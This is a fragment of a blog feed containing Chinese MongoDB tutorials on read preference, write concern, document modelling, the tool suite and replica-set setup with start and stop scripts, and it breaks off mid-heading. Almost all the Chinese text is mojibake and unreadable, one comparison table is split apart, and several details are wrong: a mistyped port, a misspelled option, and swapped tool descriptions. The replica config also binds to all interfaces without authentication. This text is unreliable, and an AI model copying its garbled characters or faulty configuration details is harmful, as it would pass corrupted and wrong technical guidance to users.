        <content type="html"><![CDATA[<h1 id="MongoDB-è¯»æ“ä½œäº‹åŠ¡"><a href="#MongoDB-è¯»æ“ä½œäº‹åŠ¡" class="headerlink" title="MongoDB è¯»æ“ä½œäº‹åŠ¡"></a>MongoDB è¯»æ“ä½œäº‹åŠ¡</h1><h2 id="ä¸€ã€ç»¼è¿°"><a href="#ä¸€ã€ç»¼è¿°" class="headerlink" title="ä¸€ã€ç»¼è¿°"></a>ä¸€ã€ç»¼è¿°</h2><ol><li>åœ¨è¯»å–æ•°æ®çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬éœ€è¦å…³æ³¨ä»¥ä¸‹ä¸¤ä¸ªé—®é¢˜ï¼š<ul><li>ä»å“ªé‡Œè¯»ï¼Ÿå…³æ³¨æ•°æ®èŠ‚ç‚¹ã€ä½ç½®</li><li>ä»€ä¹ˆæ ·çš„æ•°æ®å¯ä»¥è¯»ï¼Ÿå…³æ³¨æ•°æ®çš„éš”ç¦»æ€§</li></ul></li><li>ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯æ˜¯ç”± readPreference æ¥è§£å†³</li><li>ç¬¬äºŒä¸ªé—®é¢˜åˆ™æ˜¯ç”± readConcern æ¥è§£å†³</li></ol><h2 id="äºŒã€ä»€ä¹ˆæ˜¯-readPreferenceï¼Ÿ"><a href="#äºŒã€ä»€ä¹ˆæ˜¯-readPreferenceï¼Ÿ" class="headerlink" title="äºŒã€ä»€ä¹ˆæ˜¯ readPreferenceï¼Ÿ"></a>äºŒã€ä»€ä¹ˆæ˜¯ readPreferenceï¼Ÿ</h2><p>readPreference å†³å®šä½¿ç”¨å“ªä¸€ä¸ªèŠ‚ç‚¹æ¥æ»¡è¶³æ­£åœ¨å‘èµ·çš„è¯»è¯·æ±‚ã€‚<br>å¯é€‰å€¼åŒ…æ‹¬ï¼š</p><ul><li>primaryï¼šåªé€‰æ‹©ä¸»èŠ‚ç‚¹ï¼ˆé»˜è®¤å€¼ï¼‰ï¼›</li><li>primaryPreferredï¼šä¼˜å…ˆé€‰æ‹©ä¸»èŠ‚ç‚¹ï¼Œå¦‚æœä¸å¯ç”¨åˆ™é€‰æ‹©ä»èŠ‚ç‚¹ï¼›</li><li>secondaryï¼šåªé€‰æ‹©ä»èŠ‚ç‚¹ï¼›</li><li>secondaryPreferredï¼šä¼˜å…ˆé€‰æ‹©ä»èŠ‚ç‚¹ï¼Œå¦‚æœä»èŠ‚ç‚¹ä¸å¯ç”¨åˆ™é€‰æ‹©ä¸»èŠ‚ç‚¹ï¼›</li><li>nearestï¼šé€‰æ‹©æœ€è¿‘çš„èŠ‚ç‚¹ï¼ˆpingï¼‰ï¼›</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619926047938-112abbc2-8f04-48d5-8b43-f17b2a93760a.png#clientId=u80c902ca-1073-4&amp;from=paste&amp;height=225&amp;id=u093cd6a1&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=355&amp;originWidth=616&amp;originalType=binary%E2%88%B6=1&amp;size=57417&amp;status=done&amp;style=none&amp;taskId=u2b93d0d7-80c3-4f4f-9510-da575bee328&amp;width=391" alt="image.png"></p><h2 id="ä¸‰ã€readPreference-åœºæ™¯ä¸¾ä¾‹"><a href="#ä¸‰ã€readPreference-åœºæ™¯ä¸¾ä¾‹" class="headerlink" title="ä¸‰ã€readPreference åœºæ™¯ä¸¾ä¾‹"></a>ä¸‰ã€readPreference åœºæ™¯ä¸¾ä¾‹</h2><ul><li>ç”¨æˆ·ä¸‹è®¢å•åé©¬ä¸Šå°†ç”¨æˆ·è½¬åˆ°è®¢å•è¯¦æƒ…é¡µâ€”â€”primary/primaryPreferredã€‚å› ä¸ºæ­¤æ—¶ä»èŠ‚ç‚¹å¯èƒ½è¿˜æ²¡å¤åˆ¶åˆ°æ–°è®¢å•ï¼›</li><li>ç”¨æˆ·æŸ¥è¯¢è‡ªå·±ä¸‹è¿‡çš„è®¢å•â€”â€”secondary/secondaryPreferredã€‚æŸ¥è¯¢å†å²è®¢å•å¯¹æ—¶æ•ˆæ€§é€šå¸¸æ²¡æœ‰å¤ªé«˜è¦æ±‚ï¼›</li><li>ç”ŸæˆæŠ¥è¡¨â€”â€”SRcondaryã€‚æŠ¥è¡¨å¯¹æ—¶æ•ˆæ€§è¦æ±‚ä¸é«˜ï¼Œä½†èµ„æºéœ€æ±‚å¤§ï¼Œå¯ä»¥åœ¨ä»èŠ‚ç‚¹å•ç‹¬å¤„ç†ï¼Œé¿å…å¯¹çº¿ä¸Šç”¨æˆ·é€ æˆå½±å“ï¼›</li><li>å°†ç”¨æˆ·ä¸Šä¼ çš„å›¾ç‰‡åˆ†å‘åˆ°å…¨ä¸–ç•Œï¼Œè®©å„åœ°ç”¨æˆ·èƒ½å¤Ÿå°±è¿‘è¯»å–â€”â€”nearestã€‚æ¯ä¸ªåœ°åŒºçš„åº”ç”¨é€‰æ‹©æœ€è¿‘çš„èŠ‚ç‚¹è¯»å–æ•°æ®ã€‚</li></ul><h2 id="å››ã€readPreference-é…ç½®"><a href="#å››ã€readPreference-é…ç½®" class="headerlink" title="å››ã€readPreference é…ç½®"></a>å››ã€readPreference é…ç½®</h2><p><strong>é€šè¿‡ MongoDB çš„è¿æ¥ä¸²å‚æ•°ï¼š</strong></p><ul><li>mongodb://host1:27107,host2:27107,host3:27017/?replicaSet=rs&amp;readPreference=secondary</li></ul><p><strong>é€šè¿‡ MongoDB é©±åŠ¨ç¨‹åº APlï¼š</strong></p><ul><li>Mongocollection.withReadPreference(ReadPreference readPref)</li></ul><p><strong>Mongo Shell:</strong></p><ul><li>db.collection.find({}).readPref(â€œsecondaryâ€)</li></ul>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDBå†™æ“ä½œäº‹åŠ¡</title>
      <link href="/post/3d05e00f.html"/>
      <url>/post/3d05e00f.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-å†™æ“ä½œäº‹åŠ¡"><a href="#MongoDB-å†™æ“ä½œäº‹åŠ¡" class="headerlink" title="MongoDB å†™æ“ä½œäº‹åŠ¡"></a>MongoDB å†™æ“ä½œäº‹åŠ¡</h1><h2 id="ä¸€ã€ä»€ä¹ˆæ˜¯-writeConcern"><a href="#ä¸€ã€ä»€ä¹ˆæ˜¯-writeConcern" class="headerlink" title="ä¸€ã€ä»€ä¹ˆæ˜¯ writeConcern?"></a>ä¸€ã€ä»€ä¹ˆæ˜¯ writeConcern?</h2><ol><li>writeConcern å†³å®šä¸€ä¸ªå†™æ“ä½œè½åˆ°å¤šå°‘ä¸ªèŠ‚ç‚¹ä¸Šæ‰ç®—æˆåŠŸã€‚</li><li>writeConcern çš„å–å€¼åŒ…æ‹¬ï¼š<ul><li>0ï¼šå‘èµ·å†™æ“ä½œï¼Œä¸å…³å¿ƒæ˜¯å¦æˆåŠŸï¼›</li><li>1~é›†ç¾¤æœ€å¤§æ•°æ®èŠ‚ç‚¹æ•°ï¼šå†™æ“ä½œéœ€è¦è¢«å¤åˆ¶åˆ°æŒ‡å®šèŠ‚ç‚¹æ•°æ‰ç®—æˆåŠŸï¼›</li><li>majorityï¼šå†™æ“ä½œéœ€è¦è¢«å¤åˆ¶åˆ°å¤§å¤šæ•°èŠ‚ç‚¹ä¸Šæ‰ç®—æˆåŠŸï¼›</li></ul></li><li>å‘èµ·å†™æ“ä½œçš„ç¨‹åºå°†é˜»å¡åˆ°å†™æ“ä½œåˆ°è¾¾æŒ‡å®šçš„èŠ‚ç‚¹æ•°ä¸ºæ­¢</li></ol><h2 id="äºŒã€writeConcern-è®¾ç½®"><a href="#äºŒã€writeConcern-è®¾ç½®" class="headerlink" title="äºŒã€writeConcern è®¾ç½®"></a>äºŒã€writeConcern è®¾ç½®</h2><p>â€”ï¼šæ•°æ®å†™å…¥è¿‡ç¨‹<br>â€”ï¼šæ•°æ®åŒæ­¥è¿‡ç¨‹</p><h3 id="1-3-èŠ‚ç‚¹å¤åˆ¶é›†ä¸ä½œä»»ä½•ç‰¹åˆ«è®¾å®šï¼ˆé»˜è®¤å€¼ï¼‰ï¼š"><a href="#1-3-èŠ‚ç‚¹å¤åˆ¶é›†ä¸ä½œä»»ä½•ç‰¹åˆ«è®¾å®šï¼ˆé»˜è®¤å€¼ï¼‰ï¼š" class="headerlink" title="1. 3 èŠ‚ç‚¹å¤åˆ¶é›†ä¸ä½œä»»ä½•ç‰¹åˆ«è®¾å®šï¼ˆé»˜è®¤å€¼ï¼‰ï¼š"></a>1. 3 èŠ‚ç‚¹å¤åˆ¶é›†ä¸ä½œä»»ä½•ç‰¹åˆ«è®¾å®šï¼ˆé»˜è®¤å€¼ï¼‰ï¼š</h3><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619923878369-8f39f023-5ef4-4db6-b640-44fa5f80e0fb.png#clientId=ud64c5588-7357-4&amp;from=paste&amp;height=216&amp;id=uefc70add&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=365&amp;originWidth=785&amp;originalType=binary%E2%88%B6=1&amp;size=44512&amp;status=done&amp;style=none&amp;taskId=u404f2ca6-6d88-4d1d-831c-0f06fdeedce&amp;width=463.5" alt="image.png"></p><blockquote><p>æ³¨ï¼šå­˜åœ¨ä¸¢æ•°æ®çš„å¯èƒ½</p></blockquote><h3 id="2-wï¼šâ€majorityâ€"><a href="#2-wï¼šâ€majorityâ€" class="headerlink" title="2. wï¼šâ€majorityâ€"></a>2. wï¼šâ€majorityâ€</h3><p>å¤§å¤šæ•°èŠ‚ç‚¹ç¡®è®¤æ¨¡å¼<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619924280392-2e8b9d19-0d67-4914-b05c-3a25e57e048c.png#clientId=ud64c5588-7357-4&amp;from=paste&amp;height=231&amp;id=ud6836e31&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=382&amp;originWidth=737&amp;originalType=binary%E2%88%B6=1&amp;size=45835&amp;status=done&amp;style=none&amp;taskId=u1a0919ad-af25-4006-af40-01586f7e46e&amp;width=445.5" alt="image.png"></p><blockquote><p>æ³¨ï¼šå¯é˜²æ­¢ä¸»èŠ‚ç‚¹å®•æœºæ•°æ®ä¸¢å¤±</p></blockquote><h3 id="3-wï¼šâ€allâ€"><a href="#3-wï¼šâ€allâ€" class="headerlink" title="3. wï¼šâ€allâ€"></a>3. wï¼šâ€allâ€</h3><p>å…¨éƒ¨èŠ‚ç‚¹ç¡®è®¤æ¨¡å¼<br><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619924518289-abd78824-4af0-42ec-b560-19ad69bdd62b.png#clientId=ud64c5588-7357-4&amp;from=paste&amp;height=245&amp;id=ue661f910&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=379&amp;originWidth=731&amp;originalType=binary%E2%88%B6=1&amp;size=47791&amp;status=done&amp;style=none&amp;taskId=udace2fcc-1e11-4d8b-a80c-ff881fe63c4&amp;width=472.5" alt="image.png"></p><blockquote><p>æ³¨ï¼šæœ€å®‰å…¨çš„åšæ³•ï¼Œå¼Šç«¯æ˜¯å¦‚æœå…¶ä¸­æœ‰ä¸€ä¸ªèŠ‚ç‚¹å®•æœºå†™æ“ä½œå°±æ— æ³•å®Œæˆ</p></blockquote><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="ä¸‰ã€journal-è®¾ç½®"><a href="#ä¸‰ã€journal-è®¾ç½®" class="headerlink" title="ä¸‰ã€journal è®¾ç½®"></a>ä¸‰ã€journal è®¾ç½®</h2><h3 id="1-jï¼štrue"><a href="#1-jï¼štrue" class="headerlink" title="1. jï¼štrue"></a>1. jï¼štrue</h3><p><strong>writeConcern</strong>å¯ä»¥å†³å®šå†™æ“ä½œåˆ°è¾¾å¤šå°‘ä¸ªèŠ‚ç‚¹æ‰ç®—æˆåŠŸï¼Œ<strong>journal</strong>åˆ™å®šä¹‰å¦‚ä½•æ‰ç®—æˆåŠŸã€‚<br>å–å€¼åŒ…æ‹¬ï¼š</p><ul><li>trueï¼šå†™æ“ä½œè½åˆ° journal æ–‡ä»¶ä¸­æ‰ç®—æˆåŠŸ;</li><li>falseï¼šå†™æ“ä½œåˆ°è¾¾å†…å­˜å³ç®—ä½œæˆåŠŸã€‚</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619924828479-5e526ce7-f73f-41c0-a318-44bdc2baeb14.png#clientId=ud64c5588-7357-4&amp;from=paste&amp;height=223&amp;id=udf707040&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=352&amp;originWidth=644&amp;originalType=binary%E2%88%B6=1&amp;size=51447&amp;status=done&amp;style=none&amp;taskId=ud19e5924-4a9f-44d7-ad27-a5fd27461d0&amp;width=408" alt="image.png"></p><h2 id="å››ã€writeConcern-çš„æ„ä¹‰"><a href="#å››ã€writeConcern-çš„æ„ä¹‰" class="headerlink" title="å››ã€writeConcern çš„æ„ä¹‰"></a>å››ã€writeConcern çš„æ„ä¹‰</h2><p>å¯¹äº<strong>5 ä¸ªèŠ‚ç‚¹</strong>çš„å¤åˆ¶é›†æ¥è¯´ï¼Œå†™æ“ä½œè½åˆ°ä»¥ä¸‹èŠ‚ç‚¹ä¸Šæ‰ç®—æ˜¯å®‰å…¨çš„ï¼š</p><ul><li>3</li><li>4</li><li>5</li><li>majority</li></ul><h2 id="äº”ã€æ³¨æ„äº‹é¡¹"><a href="#äº”ã€æ³¨æ„äº‹é¡¹" class="headerlink" title="äº”ã€æ³¨æ„äº‹é¡¹"></a>äº”ã€æ³¨æ„äº‹é¡¹</h2><ul><li>è™½ç„¶å¤šäºåŠæ•°çš„ writeConcern éƒ½æ˜¯å®‰å…¨çš„ï¼Œä½†é€šå¸¸åªä¼šè®¾ç½® majorityï¼Œå› ä¸ºè¿™æ˜¯ç­‰å¾…å†™å…¥å»¶è¿Ÿæ—¶é—´æœ€çŸ­çš„é€‰æ‹©ï¼›</li><li>ä¸è¦è®¾ç½® writeConcern ç­‰äºæ€»èŠ‚ç‚¹æ•°ï¼Œå› ä¸ºä¸€æ—¦æœ‰ä¸€ä¸ªèŠ‚ç‚¹æ•…éšœï¼Œæ‰€æœ‰å†™æ“ä½œéƒ½å°†å¤±è´¥ï¼›</li><li>writeConcern è™½ç„¶ä¼šå¢åŠ å†™æ“ä½œå»¶è¿Ÿæ—¶é—´ï¼Œä½†å¹¶ä¸ä¼šæ˜¾è‘—å¢åŠ é›†ç¾¤å‹åŠ›ï¼Œå› æ­¤æ— è®ºæ˜¯å¦ç­‰å¾…ï¼Œå†™æ“ä½œæœ€ç»ˆéƒ½ä¼šå¤åˆ¶åˆ°æ‰€æœ‰èŠ‚ç‚¹ä¸Šã€‚è®¾ç½® writeConcern åªæ˜¯è®©å†™æ“ä½œç­‰å¾…å¤åˆ¶åå†è¿”å›è€Œå·²ï¼›</li><li>åº”å¯¹é‡è¦æ•°æ®åº”ç”¨ {w: â€œmajorityâ€}ï¼Œæ™®é€šæ•°æ®å¯ä»¥åº”ç”¨ {w: 1} ä»¥ç¡®ä¿æœ€ä½³æ€§èƒ½ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDBå»ºæ¨¡ä¹‹JSONæ–‡æ¡£æ¨¡å‹</title>
      <link href="/post/11656ade.html"/>
      <url>/post/11656ade.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-å»ºæ¨¡ä¹‹-JSON-æ–‡æ¡£æ¨¡å‹"><a href="#MongoDB-å»ºæ¨¡ä¹‹-JSON-æ–‡æ¡£æ¨¡å‹" class="headerlink" title="MongoDB å»ºæ¨¡ä¹‹ JSON æ–‡æ¡£æ¨¡å‹"></a>MongoDB å»ºæ¨¡ä¹‹ JSON æ–‡æ¡£æ¨¡å‹</h1><h2 id="ä¸€ã€MongoDB-æ–‡æ¡£æ¨¡å‹è®¾è®¡çš„ä¸‰ä¸ªè¯¯åŒº"><a href="#ä¸€ã€MongoDB-æ–‡æ¡£æ¨¡å‹è®¾è®¡çš„ä¸‰ä¸ªè¯¯åŒº" class="headerlink" title="ä¸€ã€MongoDB æ–‡æ¡£æ¨¡å‹è®¾è®¡çš„ä¸‰ä¸ªè¯¯åŒº"></a>ä¸€ã€MongoDB æ–‡æ¡£æ¨¡å‹è®¾è®¡çš„ä¸‰ä¸ªè¯¯åŒº</h2><ol><li>ä¸éœ€è¦æ¨¡å‹è®¾è®¡</li><li>MongoDB åº”ç”¨ä¸€ä¸ªè¶…çº§å¤§æ–‡æ¡£æ¥ç»„ç»‡æ‰€æœ‰æ•°æ®</li><li>MongoDB ä¸æ”¯æŒå…³è”æˆ–è€…äº‹åŠ¡</li></ol><h2 id="äºŒã€å…³äº-JSON-æ–‡æ¡£æ¨¡å‹"><a href="#äºŒã€å…³äº-JSON-æ–‡æ¡£æ¨¡å‹" class="headerlink" title="äºŒã€å…³äº JSON æ–‡æ¡£æ¨¡å‹"></a>äºŒã€å…³äº JSON æ–‡æ¡£æ¨¡å‹</h2><ol><li>æ–‡æ¡£æ¨¡å‹è®¾è®¡å¤„äºæ˜¯ç‰©ç†æ¨¡å‹è®¾è®¡é˜¶æ®µï¼ˆPDMï¼‰</li><li>JSON æ–‡æ¡£æ¨¡å‹é€šè¿‡å†…åµŒæ•°ç»„æˆ–å¼•ç”¨å­—æ®µæ¥è¡¨ç¤ºå…³ç³»</li><li>æ–‡æ¡£æ¨¡å‹è®¾è®¡ä¸éµå¾ªç¬¬ä¸‰èŒƒå¼ï¼Œå…è®¸å†—ä½™</li></ol><h2 id="ä¸‰ã€æ–‡æ¡£æ¨¡å‹çš„è®¾è®¡åŸåˆ™"><a href="#ä¸‰ã€æ–‡æ¡£æ¨¡å‹çš„è®¾è®¡åŸåˆ™" class="headerlink" title="ä¸‰ã€æ–‡æ¡£æ¨¡å‹çš„è®¾è®¡åŸåˆ™"></a>ä¸‰ã€æ–‡æ¡£æ¨¡å‹çš„è®¾è®¡åŸåˆ™</h2><ol><li>ç®€å•</li><li>æ˜“ç”¨</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1619920388846-0d5ee5ca-5700-4009-a981-b87da22dc388.png#clientId=udd5e4ab8-6846-4&amp;from=paste&amp;height=115&amp;id=u989b3253&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=229&amp;originWidth=856&amp;originalType=binary%E2%88%B6=1&amp;size=43946&amp;status=done&amp;style=none&amp;taskId=u600d75c8-bb37-4adf-b555-58f1a6b56eb&amp;width=428" alt="image.png"></p><h2 id="å››ã€å…³ç³»æ¨¡å‹-vs-æ–‡æ¡£æ¨¡å‹"><a href="#å››ã€å…³ç³»æ¨¡å‹-vs-æ–‡æ¡£æ¨¡å‹" class="headerlink" title="å››ã€å…³ç³»æ¨¡å‹ vs æ–‡æ¡£æ¨¡å‹"></a>å››ã€å…³ç³»æ¨¡å‹ vs æ–‡æ¡£æ¨¡å‹</h2><table><thead><tr><th><strong>-</strong></th><th><strong>å…³ç³»å‹æ•°æ®åº“</strong></th><th><strong>JSON æ–‡æ¡£æ¨¡å‹</strong></th></tr></thead><tbody><tr><td><strong>æ¨¡å‹è®¾è®¡å±‚æ¬¡</strong></td><td>æ¦‚å¿µæ¨¡å‹</td><td></td></tr></tbody></table><p>é€»è¾‘æ¨¡å‹<br>ç‰©ç†æ¨¡å‹ | æ¦‚å¿µæ¨¡å‹<br>é€»è¾‘æ¨¡å‹ |<br>| <strong>æ¨¡å‹å®ä½“</strong> | è¡¨ | é›†åˆ |<br>| <strong>æ¨¡å‹å±æ€§</strong> | åˆ— | å­—æ®µ |<br>| <strong>æ¨¡å‹å…³ç³»</strong> | å…³è”å…³ç³»ï¼Œä¸»å¤–é”® | å†…åµŒæ•°ç»„ï¼Œå¼•ç”¨å­—æ®µ |</p>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDBå…¨å®¶æ¡¶</title>
      <link href="/post/d92f6e3e.html"/>
      <url>/post/d92f6e3e.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-å…¨å®¶æ¡¶"><a href="#MongoDB-å…¨å®¶æ¡¶" class="headerlink" title="MongoDB å…¨å®¶æ¡¶"></a>MongoDB å…¨å®¶æ¡¶</h1><h2 id="MongoDB-å…¨å®¶æ¡¶-1"><a href="#MongoDB-å…¨å®¶æ¡¶-1" class="headerlink" title="MongoDB å…¨å®¶æ¡¶"></a>MongoDB å…¨å®¶æ¡¶</h2><table><thead><tr><th><strong>è½¯ä»¶æ¨¡å—</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody><tr><td>mongod</td><td>MongoDB æ•°æ®åº“è½¯ä»¶</td></tr><tr><td>mongo</td><td>MongoDB å‘½ä»¤è¡Œå·¥å…·ï¼Œç®¡ç† MongoDB æ•°æ®åº“</td></tr><tr><td>mongos</td><td>MongoDB è·¯ç”±è¿›ç¨‹ï¼Œåˆ†ç‰‡ç¯å¢ƒä¸‹ä½¿ç”¨</td></tr><tr><td>mongodump / mongorestore</td><td>å‘½ä»¤è¡Œæ•°æ®åº“å¤‡ä»½ä¸æ¢å¤å·¥å…·</td></tr><tr><td>mongoexport / mongoimport</td><td>CSV/JSON å¯¼å…¥ä¸å¯¼å‡ºï¼Œä¸»è¦ç”¨äºä¸åŒç³»ç»Ÿé—´æ•°æ®è¿ç§»</td></tr><tr><td>Compass</td><td>MongoDB GUI ç®¡ç†å·¥å…·</td></tr><tr><td>Ops Manager(ä¼ä¸šç‰ˆ)</td><td>SQL è§£é‡Šå™¨ / BI å¥—æ¥ä»¶</td></tr><tr><td>BI Connector(ä¼ä¸šç‰ˆ)</td><td>MongoDB å¯è§†åŒ–è½¯ä»¶</td></tr><tr><td>Atlas (ä»˜è´¹åŠå…è´¹)</td><td>MongoDB äº‘æ‰˜ç®¡æœåŠ¡ï¼ŒåŒ…æ‹¬æ°¸ä¹…å…è´¹äº‘æ•°æ®åº“</td></tr></tbody></table><h2 id="Mongodump-mongorestore"><a href="#Mongodump-mongorestore" class="headerlink" title="Mongodump / mongorestore"></a>Mongodump / mongorestore</h2><ul><li>ç±»ä¼¼äº MySQL çš„ dump/restore å·¥å…·</li><li>å¯ä»¥å®Œæˆå…¨åº“ dump: ä¸åŠ æ¡ä»¶</li><li>ä¹Ÿå¯ä»¥æ ¹æ®æ¡ä»¶ dump éƒ¨åˆ†æ•°æ®: -q å‚æ•°</li><li>Dump çš„åŒæ—¶è·Ÿè¸ªæ•°æ®å°±æ›´: â€“oplog</li><li>Restore æ˜¯åæ“ä½œï¼ŒæŠŠ mongodump çš„è¾“å‡ºå¯¼å…¥åˆ° mongodb</li><li>æ“ä½œç¤ºä¾‹ï¼š</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># å¤‡ä»½æ•°æ®ï¼Œ-d æ•°æ®åº“ -c é›†åˆ</span>mongodump -h 127.0.0.1:27017 -d <span class="token function">test</span> -c <span class="token function">test</span><span class="token comment" spellcheck="true"># æ¢å¤æ•°æ®ï¼Œ-d æ•°æ®åº“ -c é›†åˆ å¤‡ä»½æ–‡ä»¶</span>mongorestore -h 127.0.0.1:27017 -d <span class="token function">test</span> -c <span class="token function">test</span> xxx.bson<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> MongoDB </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDBå‰¯æœ¬é›†æ¨¡å¼æ­å»º</title>
      <link href="/post/2cc57599.html"/>
      <url>/post/2cc57599.html</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB-å‰¯æœ¬é›†æ¨¡å¼æ­å»º"><a href="#MongoDB-å‰¯æœ¬é›†æ¨¡å¼æ­å»º" class="headerlink" title="MongoDB å‰¯æœ¬é›†æ¨¡å¼æ­å»º"></a>MongoDB å‰¯æœ¬é›†æ¨¡å¼æ­å»º</h1><h2 id="ä¸€ã€å‡†å¤‡"><a href="#ä¸€ã€å‡†å¤‡" class="headerlink" title="ä¸€ã€å‡†å¤‡"></a>ä¸€ã€å‡†å¤‡</h2><ul><li>å®‰è£…æœ€æ–°çš„ MongoDB ç‰ˆæœ¬</li><li>Windows ç³»ç»Ÿé…ç½®å¥½ Mongo å¯æ‰§è¡Œæ–‡ä»¶çš„ç¯å¢ƒå˜é‡</li><li>Linux å’Œ Mac ç³»ç»Ÿé…ç½®å¥½ PATH å˜é‡</li><li>ç¡®ä¿æœ‰ 10GB ä»¥ä¸Šçš„ç¡¬ç›˜ç©ºé—´</li></ul><h2 id="äºŒã€åˆ›å»ºæ•°æ®ç›®å½•"><a href="#äºŒã€åˆ›å»ºæ•°æ®ç›®å½•" class="headerlink" title="äºŒã€åˆ›å»ºæ•°æ®ç›®å½•"></a>äºŒã€åˆ›å»ºæ•°æ®ç›®å½•</h2><p>MongoDB å¯åŠ¨æ—¶å°†ä½¿ç”¨ä¸€ä¸ªæ•°æ®ç›®å½•å­˜æ”¾æ‰€æœ‰æ•°æ®æ–‡ä»¶ã€‚<br>éœ€è¦ä¸º 3 ä¸ªå¤åˆ¶èŠ‚ç‚¹åˆ›å»ºå„è‡ªçš„æ•°æ®ç›®å½•ã€‚</p><p>Linux/MacOSï¼š</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mkdir</span> -p /data/db<span class="token punctuation">{</span>1,2,3<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Windowsï¼š</p><pre class="line-numbers language-bash"><code class="language-bash">md D:\mongodb\data\db1md D:\mongodb\data\db2md D:\mongodb\data\db3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="ä¸‰ã€å‡†å¤‡é…ç½®æ–‡ä»¶"><a href="#ä¸‰ã€å‡†å¤‡é…ç½®æ–‡ä»¶" class="headerlink" title="ä¸‰ã€å‡†å¤‡é…ç½®æ–‡ä»¶"></a>ä¸‰ã€å‡†å¤‡é…ç½®æ–‡ä»¶</h2><p>å¤åˆ¶é›†çš„æ¯ä¸ª mongod è¿›ç¨‹åº”è¯¥ä½äºä¸åŒçš„æœåŠ¡å™¨ã€‚<br>ç°åœ¨åœ¨ä¸€å°æœºå™¨ä¸Šè¿è¡Œ 3 ä¸ªè¿›ç¨‹ï¼Œå› æ­¤è¦ä¸ºå®ƒä»¬å„è‡ªé…ç½®ï¼š</p><ul><li>ä¸åŒçš„ç«¯å£ã€‚ç¤ºä¾‹å°†ä½¿ç”¨ 28017/27018/28019</li><li>ä¸åŒçš„æ•°æ®ç›®å½•ã€‚ç¤ºä¾‹ä¸­å°†ä½¿ç”¨ï¼š</li></ul><p>/data/db1<br>/data/db2<br>/data/db3</p><ul><li>ä¸åŒæ—¥å¿—æ–‡ä»¶è·¯å¾„ã€‚ç¤ºä¾‹ä¸­å°†ä½¿ç”¨ï¼š</li></ul><p>/data/db1/mongod.log<br>/data/db2/mongod.log<br>/data/db3/mongod.log<br>é…ç½®æ–‡ä»¶ <strong>/data/db1/mongod.conf</strong>ï¼š</p><pre><code>systemLog:  destination: file  path: /data/db1/mongod.log  # log path  logAppend: truestorage:  dbPath: /data/db1  # data directorynet:  bindIp: 0.0.0.0  port: 28017  # portreplication:  replSetName: rs0processManagement:  fork: true</code></pre><p>åŒä¸Šï¼Œé…ç½®**/data/db2/mongod.conf<strong>å’Œ</strong>/data/db3/mongod.conf**</p><h2 id="å››ã€å¯åŠ¨åœæ­¢"><a href="#å››ã€å¯åŠ¨åœæ­¢" class="headerlink" title="å››ã€å¯åŠ¨åœæ­¢"></a>å››ã€å¯åŠ¨åœæ­¢</h2><h3 id="1-å¯åŠ¨è„šæœ¬"><a href="#1-å¯åŠ¨è„šæœ¬" class="headerlink" title="1. å¯åŠ¨è„šæœ¬"></a>1. å¯åŠ¨è„šæœ¬</h3><p><strong><em>mongod-start.sh</em></strong></p><pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bashecho -e "\033[31mStart mongod service...\n \033[0m"mongod -f /data/db1/mongod.confmongod -f /data/db2/mongod.confmongod -f /data/db3/mongod.confecho -e "\033[32mmongod service is running.\n \033[0m"# Whether the query is runningps -ef | grep mongod<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-åœæ­¢è„šæœ¬"><a href="#2-åœæ­¢è„šæœ¬" class="headerlink" title="2. åœæ­¢è„šæœ¬"></a>2. åœæ­¢è„šæœ¬</h3><p><strong><em>mongod-stop.sh</em></strong></p><pre class="line-numbers language-shell"><code class="language-shell">#!/bin/bashpid=`ps -o pid,command ax | grep mongod | awk '!/awk/ && !/grep/ {print $1}'`;if [ "${pid}" != "" ]; then kill -2 ${pid};fiecho -e "\033[31mThe mongod service has stopped. \033[0m"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-æ·»åŠ æ‰§è¡Œæƒé™å¹¶è¿è¡Œ"><a href="#3-æ·»åŠ æ‰§è¡Œæƒé™å¹¶è¿è¡Œ" class="headerlink" title="3. æ·»åŠ 